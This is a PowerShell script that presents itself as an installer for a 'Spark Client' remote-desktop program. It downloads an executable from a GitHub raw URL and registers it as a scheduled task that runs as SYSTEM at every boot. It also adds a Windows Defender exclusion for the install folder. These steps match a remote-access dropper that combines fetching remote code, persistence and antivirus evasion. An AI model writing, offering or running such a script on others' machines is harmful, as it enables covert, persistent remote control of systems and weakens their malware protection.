# install-spark-client.ps1
# Auto install Spark Client on Windows

$RepoUrl = "https://raw.githubusercontent.com/tutamdev/remote-desktop/main"
$ClientUrl = "$RepoUrl/client.exe"

$DestDir = "C:\Program Files\Spark"
$DestExe = Join-Path $DestDir "client.exe"
$TaskName = "SparkClient"

Write-Host ">>> Installing Spark Client..."

# 1. Create destination folder
if (!(Test-Path -Path $DestDir)) {
    Write-Host ">>> Creating folder: $DestDir"
    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
}

# 2. Download client.exe
Write-Host ">>> Downloading client.exe from $ClientUrl"
Invoke-WebRequest -Uri $ClientUrl -OutFile $DestExe -UseBasicParsing

# 3. Remove old scheduled task if exists
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host ">>> Removing old scheduled task: $TaskName"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# 4. Create new scheduled task (auto run at startup)
Write-Host ">>> Registering scheduled task: $TaskName"
$Action = New-ScheduledTaskAction -Execute $DestExe
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal

# 5. Add Defender exclusion
Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
try {
    Add-MpPreference -ExclusionPath $DestDir
    Write-Host ">>> Defender exclusion added successfully."
} catch {
    Write-Warning ">>> Failed to add exclusion (please run PowerShell as Administrator)."
}

Write-Host ">>> Done. Spark Client will auto-start at Windows boot."
